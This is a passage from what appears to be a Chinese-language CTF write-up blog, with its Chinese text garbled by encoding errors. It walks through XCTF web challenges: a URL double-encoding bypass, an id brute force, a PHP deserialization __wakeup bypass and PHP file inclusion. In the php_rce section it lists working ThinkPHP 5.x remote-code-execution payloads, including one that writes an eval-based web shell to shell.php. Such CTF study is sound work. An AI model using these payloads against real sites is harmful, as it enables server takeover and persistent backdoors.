punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>hex_value<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> hex_value <span class=\"token keyword\">in</span> hex_values<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>ascii_values <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">55</span><span class=\"token punctuation\">,</span><span class=\"token number\">56</span><span class=\"token punctuation\">,</span><span class=\"token number\">54</span><span class=\"token punctuation\">,</span><span class=\"token number\">79</span><span class=\"token punctuation\">,</span><span class=\"token number\">115</span><span class=\"token punctuation\">,</span><span class=\"token number\">69</span><span class=\"token punctuation\">,</span><span class=\"token number\">114</span><span class=\"token punctuation\">,</span><span class=\"token number\">116</span><span class=\"token punctuation\">,</span><span class=\"token number\">107</span><span class=\"token punctuation\">,</span><span class=\"token number\">49</span><span class=\"token punctuation\">,</span><span class=\"token number\">50</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> value <span class=\"token keyword\">in</span> ascii_values<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\">#55,56,54,79,115,69,114,116,107,49,50</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">#786OsErtk12</span></pre></td></tr></table></figure><blockquote 786OsErtk12=\"\">\n<p>flag</p>\n</blockquote>\n<h2 id=\"baby_web\"><a class=\"markdownIt-Anchor\" href=\"#baby_web\">#</a> baby_web:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824221304273.png\" alt=\"image-20230824221304273\"></p>\n<p><img data-src=\"/img/webpic/image-20230824221335028.png\" alt=\"image-20230824221335028\"></p>\n<p>ËøõÂÖ•È¢òÁõÆÈ°µÈù¢„ÄÇÂàùÂßãÈ°µÈù¢‰∏ÄËà¨ÊòØ index.php</p>\n<p>ËØïÁùÄ‰º†ÂÖ• index.php ËØï‰∏Ä‰∏ã</p>\n<p>‰ΩÜÊòØÂèàÂõûÂà∞ 1.php</p>\n<p>Áî® burp ‰º†‰∏Ä‰∏ãËØï‰∏Ä‰∏ã</p>\n<p><img data-src=\"/img/webpic/image-20230824221652725.png\" alt=\"image-20230824221652725\"></p>\n<p>ÊàêÂäüÊâæÂà∞ flag</p>\n<h2 id=\"php2\"><a class=\"markdownIt-Anchor\" href=\"#php2\">#</a> PHP2:&gt;</h2>\n<blockquote>\n<p>ÂâçÁΩÆÁü•ËØÜÔºö</p>\n<p>phps Âç≥‰∏∫ PHP Source„ÄÇ</p>\n<p>phps Êñá‰ª∂Â∞±ÊòØ php ÁöÑÊ∫ê‰ª£Á†ÅÊñá‰ª∂ÔºåÈÄöÂ∏∏Áî®‰∫éÊèê‰æõÁªôÁî®Êà∑ÔºàËÆøÈóÆËÄÖÔºâÊü•Áúã php ‰ª£Á†ÅÔºåÂõ†‰∏∫Áî®Êà∑Êó†Ê≥ïÁõ¥Êé•ÈÄöËøá Web ÊµèËßàÂô®ÁúãÂà∞ php Êñá‰ª∂ÁöÑÂÜÖÂÆπÔºåÊâÄ‰ª•ÈúÄË¶ÅÁî® phps Êñá‰ª∂‰ª£Êõø„ÄÇÂÖ∂ÂÆûÔºåÂè™Ë¶Å‰∏çÁî® php Á≠âÂ∑≤ÁªèÂú®ÊúçÂä°Âô®‰∏≠Ê≥®ÂÜåËøáÁöÑ MIME Á±ªÂûã‰∏∫Êñá‰ª∂Âç≥ÂèØÔºå‰ΩÜ‰∏∫‰∫ÜÂõΩÈôÖÈÄöÁî®ÔºåÊâÄ‰ª•ÊâçÁî®‰∫Ü phps Êñá‰ª∂Á±ªÂûã</p>\n</blockquote>\n<p>ËøôÈ¢ò php Êü•Áúã‰∏ç‰∫ÜÊ∫êÁ†ÅÔºåÂè™ËÉΩÁî® phps Êü•Áúã„ÄÇ</p>\n<p><img data-src=\"/img/webpic/image-20230824222125570.png\" alt=\"image-20230824222125570\"></p>\n<p>ÊúâÁÇπ‰π±ÔºåÁî® burp Áúã‰∏ÄÁúº„ÄÇ</p>\n<p><img data-src=\"/img/webpic/image-20230824222253677.png\" alt=\"image-20230824222253677\"></p>\n<p>Â§ßÊ¶ÇÊÑèÊÄùÂ∞±ÊòØÔºåGET ËØ∑Ê±ÇÔºåÂ¶ÇÊûú admin Á≠â‰∫é‰º†ÂÖ•ÁöÑ id Âú®ÈÄÄÂá∫Ôºå‰ΩÜÊòØ‰∏ãÈù¢ÂèØ‰ª•ÈÄöËøá url Ëß£Á†ÅÂéªÁªïËøá</p>\n<blockquote>\n<p>1, Âè™ÊîπÂèò a Âç≥ %61dmin</p>\n<p>2, ÂÖ®ÈÉΩÊîπÂèò %61%64%6d%69%6e</p>\n</blockquote>\n<p>‰ΩÜÊòØÔºåËøõÂÖ•ÁΩëÈ°µÂèØË¶Å url Ëß£Á†Å‰∏ÄÊ¨°ÔºåÊâÄ‰ª• % Ë¶ÅÊîπÂèò %25</p>\n<blockquote>\n<p>Âç≥ÊúÄÁªàÁöÑ payload ÁöÑ‰∏∫Ôºö?id=%2561%2564%256d%2569%256e</p>\n<p>‚Äã\t\t\t\t   \t\t\tor   ?id=%2561dmin</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824223440837.png\" alt=\"image-20230824223440837\"></p>\n<h2 id=\"ics-06\"><a class=\"markdownIt-Anchor\" href=\"#ics-06\">#</a> ics-06:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824223657576.png\" alt=\"image-20230824223657576\"></p>\n<p><img data-src=\"/img/webpic/image-20230824223722948.png\" alt=\"image-20230824223722948\"></p>\n<p>Âè™ÊúâÊä•Ë°®‰∏≠ÂøÉÂèØ‰ª•ÁÇπ</p>\n<p><img data-src=\"/img/webpic/image-20230824223808888.png\" alt=\"image-20230824223808888\"></p>\n<p>ÂèëÁé∞Êúâ GET ‰º† id ÁöÑÊñπÂºè</p>\n<p>Áî® burp Êäì‰∏ãÂåÖÁúã‰∏Ä‰∏ã„ÄÇÔºàÊ≤°ÊúâÂà´ÁöÑÂèëÁé∞ÔºåÂè™ËÉΩÂØπ id ÁàÜÁ†¥</p>\n<p><img data-src=\"/img/webpic/image-20230824224221045.png\" alt=\"image-20230824224221045\"></p>\n<p>ËøôÈáåÊ∑ªÂä† payload„ÄÇ</p>\n<p><img data-src=\"/img/webpic/image-20230824224258586.png\" alt=\"image-20230824224258586\"></p>\n<p>ËøôÊ†∑ËÆæÁΩÆ payloadÔºåÊîªÂáªÔºÅÔºÅ</p>\n<p><img data-src=\"/img/webpic/image-20230824224459083.png\" alt=\"image-20230824224459083\"></p>\n<p>id=2333 ÂºÇÂ∏∏„ÄÇËØ¥ÊòéÂÖ•‰æµËÄÖÁóïËøπÂú®Ëøô„ÄÇ</p>\n<p>Êü•ÁúãÂìçÂ∫îÂåÖ„ÄÇ</p>\n<p><img data-src=\"/img/webpic/image-20230824224825879.png\" alt=\"image-20230824224825879\"></p>\n<p>ÂèëÁé∞ flag</p>\n<h2 id=\"php_rce\"><a class=\"markdownIt-Anchor\" href=\"#php_rce\">#</a> php_rce:&gt;</h2>\n<p><img data-src=\"/img/webpic/image-20230824225156637.png\" alt=\"image-20230824225156637\"></p>\n<p>Áü•ËØÜ‰∫ÜËß£‰∏Ä‰∏ãÂêßÔºö</p>\n<blockquote>\n<p>1.ThinkPHP ÁÆÄ‰ªãÔºö<br>\nThinkPHP ÊòØ‰∏Ä‰∏™ÂºÄÊ∫êÔºåÂø´ÈÄü„ÄÅÁÆÄÂçïÁöÑËΩªÈáèÁ∫ßÂõΩ‰∫ß PHP ÂºÄÂèëÊ°ÜÊû∂ÔºåËØûÁîü‰∫é 2006 Âπ¥ÂàùÔºåÂéüÂêç FCSÔºå2007 Âπ¥ÂÖÉÊó¶Ê≠£ÂºèÊõ¥Âêç‰∏∫ ThinkPHP„ÄÇ‰ΩøÁî®Èù¢ÂêëÂØπË±°ÁöÑÂºÄÂèëÁªìÊûÑÂíå MVC Ê®°ÂºèÔºåËûçÂêà‰∫Ü Struts ÁöÑÊÄùÊÉ≥Âíå TagLibÔºàÊ†áÁ≠æÂ∫ìÔºâ„ÄÅRoR ÁöÑ ORM Êò†Â∞ÑÂíå ActiveRecord Ê®°Âºè„ÄÇ</p>\n<p>ThinkPHP ÂèØ‰ª•ÊîØÊåÅ windows/Unix/Linux Á≠âÊúçÂä°Âô®ÁéØÂ¢ÉÔºåÊ≠£ÂºèÁâàÈúÄË¶Å PHP 5.0 ‰ª•‰∏äÁâàÊú¨ÔºåÊîØÊåÅ MySql„ÄÅPgSQL„ÄÅSqlite Â§öÁßçÊï∞ÊçÆÂ∫ì‰ª•Âèä PDO Êâ©Â±ïÔºåÊòØ‰∏ÄÊ¨æË∑®Âπ≥Âè∞ÔºåË∑®ÁâàÊú¨‰ª•ÂèäÁÆÄÂçïÊòìÁî®ÁöÑ PHP Ê°ÜÊû∂„ÄÇ</p>\n</blockquote>\n<p>ÂÖ∂‰∏≠ ThinkPHP 2 ‰ª•Âèä ThinkPHP 3 Á≥ªÂàóÂ∑≤ÁªèÂÅúÊ≠¢Áª¥Êä§ÔºåThinkPHP 5 Á≥ªÂàóÁé∞‰ΩøÁî®ÊúÄÂ§öÔºåËÄå ThinkPHP 3 Á≥ªÂàó‰πüÁßØÁ¥Ø‰∫ÜËæÉÂ§öÁöÑÂéÜÂè≤Áî®Êà∑„ÄÇÂêÑ‰∏™Á≥ªÂàó‰πãÈó¥Âú®‰ª£Á†ÅÂÆûÁé∞ÂèäÂäüËÉΩÊñπÈù¢ÊúâËæÉÂ§ßÂå∫Âà´„ÄÇ</p>\n<p>ËøôÊòØ PHP V5ÔºåÊâæ‰∏ã PHP V5 ÁöÑÊºèÊ¥û„ÄÇ</p>\n<ul>\n<li>5.0.xÔºö</li>\n</ul>\n<figure class=\"highlight web-idl\"><figcaption data-lang=\"web-idl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/think\\config/get&amp;name<span class=\"token operator\">=</span>database<span class=\"token punctuation\">.</span>username <span class=\"token comment\">// Ëé∑ÂèñÈÖçÁΩÆ‰ø°ÊÅØ</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\Lang/load&amp;file<span class=\"token operator\">=</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>/<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>/test<span class=\"token punctuation\">.</span>jpg <span class=\"token comment\">// ÂåÖÂê´‰ªªÊÑèÊñá‰ª∂</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\Config/load&amp;file<span class=\"token operator\">=</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>/<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>/t<span class=\"token punctuation\">.</span>php <span class=\"token comment\">// ÂåÖÂê´‰ªªÊÑè.php Êñá‰ª∂</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\app/invokefunction&amp;function<span class=\"token operator\">=</span>call_user_func_array&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>system&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>id <span class=\"token comment\">// ÊâßË°åÂëΩ‰ª§</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>/Index/\\think\\app/invokefunction&amp;function<span class=\"token operator\">=</span>call_user_func_array&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>phpinfo&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">-1</span> <span class=\"token comment\">// ÊâßË°å phpinfo ();</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>/Index/\\think\\app/invokefunction&amp;function<span class=\"token operator\">=</span>call_user_func_array&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>file_put_contents&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>shell<span class=\"token punctuation\">.</span>php&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php @eval<span class=\"token punctuation\">(</span>$_POST<span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">></span>\t<span class=\"token comment\">// ÂÜôÂÖ• shell</span></pre></td></tr></table></figure><ul>\n<li>5.1.xÔºö</li>\n</ul>\n<figure class=\"highlight web-idl\"><figcaption data-lang=\"web-idl\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\Request/input&amp;filter<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>system&amp;data<span class=\"token operator\">=</span><span class=\"token class-name\">pwd</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">?</span></span>s<span class=\"token operator\">=</span>index/\\think\\view\\driver\\Php/display&amp;content<span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span><span class=\"token class-name\">php</span> phpinfo<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\template\\driver\\file/write&amp;cacheFile<span class=\"token operator\">=</span>shell<span class=\"token punctuation\">.</span>php&amp;content<span class=\"token operator\">=</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">?</span>php @eval<span class=\"token punctuation\">(</span>$_POST<span class=\"token punctuation\">[</span>a<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token operator\">?</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">?</span>s<span class=\"token operator\">=</span>index/\\think\\Container/invokefunction&amp;function<span class=\"token operator\">=</span>call_user_func_array&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>system&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token class-name\">id</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">?</span></span>s<span class=\"token operator\">=</span>index/\\think\\app/invokefunction&amp;function<span class=\"token operator\">=</span>call_user_func_array&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>system&amp;vars<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span>id</pre></td></tr></table></figure><p>ÊâßË°å 5.0 ÁöÑÊºèÊ¥û</p>\n<p><img data-src=\"/img/webpic/image-20230824225834486.png\" alt=\"image-20230824225834486\"></p>\n<p>ÂèëÁé∞ÂΩìÂâçÁõÆÂΩïÊ≤°Êúâ flag</p>\n<p><img data-src=\"/img/webpic/image-20230824230021454.png\" alt=\"image-20230824230021454\"></p>\n<p>Ê†πÁõÆÂΩïÊúâ flag</p>\n<p><img data-src=\"/img/webpic/image-20230824230224897.png\" alt=\"image-20230824230224897\"></p>\n<p>ÂæóÂà∞ flag</p>\n<h2 id=\"unserialize3\"><a class=\"markdownIt-Anchor\" href=\"#unserialize3\">#</a> unserialize3:&gt;</h2>\n<p>ÂèçÂ∫èÂàóÂåñÔºö</p>\n<blockquote>\n<h3 id=\"‰ªÄ‰πàÊòØÂ∫èÂàóÂåñserialize\"><a class=\"markdownIt-Anchor\" href=\"#‰ªÄ‰πàÊòØÂ∫èÂàóÂåñserialize\">#</a> ‰ªÄ‰πàÊòØÂ∫èÂàóÂåñ (serialize)</h3>\n<p>Â∞ÜÂØπË±°ÁöÑÁä∂ÊÄÅ‰ø°ÊÅØËΩ¨Êç¢‰∏∫ÂèØ‰ª•Â≠òÂÇ®Êàñ‰º†ËæìÁöÑÂΩ¢ÂºèÁöÑËøáÁ®ãÔºåÁÆÄÂçïÊù•ËØ¥ÔºåÂ∞±ÊòØÂ∞ÜÁä∂ÊÄÅ‰ø°ÊÅØ‰øùÂ≠ò‰∏∫Â≠óÁ¨¶‰∏≤</p>\n<h3 id=\"‰ªÄ‰πàÊòØÂèçÂ∫èÂàóÂåñunserialize\"><a class=\"markdownIt-Anchor\" href=\"#‰ªÄ‰πàÊòØÂèçÂ∫èÂàóÂåñunserialize\">#</a> ‰ªÄ‰πàÊòØÂèçÂ∫èÂàóÂåñ (unserialize)</h3>\n<p>Â∞ÜÂ≠óÁ¨¶‰∏≤ËΩ¨Êç¢‰∏∫Áä∂ÊÄÅ‰ø°ÊÅØ</p>\n<p>‰∫å„ÄÅ‰ªÄ‰πàÊòØÂèçÂ∫èÂàóÂåñÊºèÊ¥û</p>\n<p>ÂΩìÁ®ãÂ∫èÂú®ËøõË°åÂèçÂ∫èÂàóÂåñÊó∂Ôºå‰ºöËá™Âä®Ë∞ÉÁî®‰∏Ä‰∫õÂáΩÊï∞Ôºå‰æãÂ¶Ç_wakeup ()   _destruct () Á≠âÂáΩÊï∞Ôºå‰ΩÜÊòØÂ¶ÇÊûú‰º†ÂÖ•ÂáΩÊï∞ÁöÑÂèÇÊï∞ÂèØ‰ª•Ë¢´Áî®Êà∑ÊéßÂà∂ÁöÑËØùÔºåÁî®Êà∑ÂèØ‰ª•ËæìÂÖ•‰∏Ä‰∫õÊÅ∂ÊÑè‰ª£Á†ÅÂà∞ÂáΩÊï∞‰∏≠Ôºå‰ªéËÄåÂØºËá¥ÂèçÂ∫èÂàóÂåñÊºèÊ¥û„ÄÇ</p>\n</blockquote>\n<p>Áî±‰∫éÂèçÂ∫èÂàóÂåñÊó∂ unserialize () ÂáΩÊï∞‰ºöËá™Âä®Ë∞ÉÁî® wakeup (),destruct (), ÂáΩÊï∞ÔºåÂΩìÊúâ‰∏Ä‰∫õÊºèÊ¥ûÊàñËÄÖÊÅ∂ÊÑè‰ª£Á†ÅÂú®Ëøô‰∫õÂáΩÊï∞‰∏≠ÔºåÂΩìÊàë‰ª¨ÊéßÂà∂Â∫èÂàóÂåñÁöÑÂ≠óÁ¨¶‰∏≤Êó∂‰ºöÂéªËß¶Âèë‰ªñ‰ª¨Ôºå‰ªéËÄåËææÂà∞ÊîªÂáª„ÄÇ</p>\n<blockquote>\n<p>__construct () : ÊûÑÈÄ†ÂáΩÊï∞ÔºåÂΩìÂàõÂª∫ÂØπË±°Êó∂Ëá™Âä®Ë∞ÉÁî®„ÄÇ</p>\n<p>__destruct (): ÊûêÊûÑÂáΩÊï∞ÔºåÂú®ÂØπË±°ÁöÑÊâÄÊúâÂºïÁî®ÈÉΩË¢´Âà†Èô§Êó∂ÊàñËÄÖÂØπË±°Ë¢´ÊòæÂºèÈîÄÊØÅÊó∂Ë∞ÉÁî®ÔºåÂΩìÂØπË±°Ë¢´ÈîÄÊØÅÊó∂Ëá™Âä®Ë∞ÉÁî®„ÄÇ</p>\n<p>__wakeup (): ËøõË°å unserialize Êó∂‰ºöÊü•ÁúãÊòØÂê¶ÊúâËØ•ÂáΩÊï∞ÔºåÊúâÁöÑËØùÊúâÈôêË∞ÉÁî®„ÄÇ‰ºöËøõË°åÂàùÂßãÂåñÂØπË±°„ÄÇÈÅáÂà∞ unserialize () Êó∂Ëá™Âä®Ëß¶Âèë</p>\n<p>__ toString (): ÂΩì‰∏Ä‰∏™Á±ªË¢´ÂΩìÊàêÂ≠óÁ¨¶‰∏≤Êó∂‰ºöË¢´Ë∞ÉÁî®„ÄÇ</p>\n<p>__sleep (): ÂΩì‰∏Ä‰∏™ÂØπË±°Ë¢´Â∫èÂàóÂåñÊó∂Ë∞ÉÁî®ÔºåÂèØ‰∏éËÆæÂÆöÂ∫èÂàóÂåñÊó∂‰øùÂ≠òÁöÑÂ±ûÊÄß„ÄÇ</p>\n</blockquote>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">xctf</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'111'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'bad requests'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">?</span>code<span class=\"token operator\">=</span></pre></td></tr></table></figure><p>Ëøô‰∏™È¢òÔºåÈúÄË¶ÅÂéªÂÆåÂñÑ‰∏ã‰ª£Á†Å„ÄÇ</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">xctf</span><span class=\"token punctuation\">&#123;</span>                      <span class=\"token comment\">// ÂÆö‰πâ‰∏Ä‰∏™Âêç‰∏∫ xctf ÁöÑÁ±ª</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'111'</span><span class=\"token punctuation\">;</span>            <span class=\"token comment\">// ÂÆö‰πâ‰∏Ä‰∏™ÂÖ¨ÊúâÁöÑÁ±ªÂ±ûÊÄß $flagÔºåÂÄº‰∏∫ 111</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>      <span class=\"token comment\">// ÂÆö‰πâ‰∏Ä‰∏™ÂÖ¨ÊúâÁöÑÁ±ªÊñπÊ≥ï__wakeup ()ÔºåËæìÂá∫ bad requests ÂêéÈÄÄÂá∫ÂΩìÂâçËÑöÊú¨</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'bad requests'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token variable\">$peak</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">xctf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>           <span class=\"token comment\">// ‰ΩøÁî® new ËøêÁÆóÁ¨¶Êù•ÂÆû‰æãÂåñËØ•Á±ªÔºàxctfÔºâÁöÑÂØπË±°‰∏∫ peak</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">echo</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$peak</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>       <span class=\"token comment\">// ËæìÂá∫Ë¢´Â∫èÂàóÂåñÁöÑÂØπË±°ÔºàpeakÔºâ</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>ÊâßË°å‰∏ã</p>\n<p><img data-src=\"/img/webpic/image-20230824231257800.png\" alt=\"image-20230824231257800\"></p>\n<blockquote>\n<p s:4:flag;s:3:111;=\"\">O:4:‚Äúxctf‚Äù:1:</p>\n<p>O ‰ª£Ë°® objectÔºà‰∏∫ A Êó∂‰ª£Ë°® ArrayÔºâÔºå4 ‰ª£Ë°® &quot;test&quot; Âç† 4 ‰∏™Â≠óÁ¨¶ÈïøÂ∫¶Ôºå1 ‰ª£Ë°®ÁùÄÂØπË±°ÂÖ∑Êúâ‰∏Ä‰∏™ÂèòÈáèÔºöflagÔºås ‰ª£Ë°® stringÔºåÂ≠óÁ¨¶ÂûãÔºàÂ¶ÇÊûú‰∏∫ iÔºå‰ª£Ë°® int ÂûãÔºâ</p>\n<p>ÈáåÈù¢ÁöÑÂÄºÊòØ‰∏çÂèØ‰øÆÊîπÁöÑÔºå‰ΩÜÊòØÂèØ‰ª•‰øÆÊîπÁöÑÂ±ûÊÄß (ÂèòÈáè) Êï∞Â§ß‰∫éÂÆûÈôÖÁöÑ‰∏™Êï∞Êó∂ÔºåÂ∞±ÂèØ‰ª•ÁªïËøá wakeup</p>\n</blockquote>\n<p>ÊâÄ‰ª• payload ‰∏∫</p>\n<blockquote s:4:flag;s:3:111;=\"\">\n<p>?code=O:4:‚Äúxctf‚Äù:2:</p>\n</blockquote>\n<p><img data-src=\"/img/webpic/image-20230824231621861.png\" alt=\"image-20230824231621861\"></p>\n<h2 id=\"web_php_include\"><a class=\"markdownIt-Anchor\" href=\"#web_php_include\">#</a> Web_php_include:&gt;</h2>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// ÊòæÁ§∫ÂΩìÂâçÊñá‰ª∂ÁöÑÊ∫ê‰ª£Á†Å</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'hello'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// ËæìÂá∫Âêç‰∏∫ 'hello' ÁöÑ GET ÂèÇÊï∞ÁöÑÂÄº</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$page</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'page'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// Â∞ÜÂêç‰∏∫ 'page' ÁöÑ 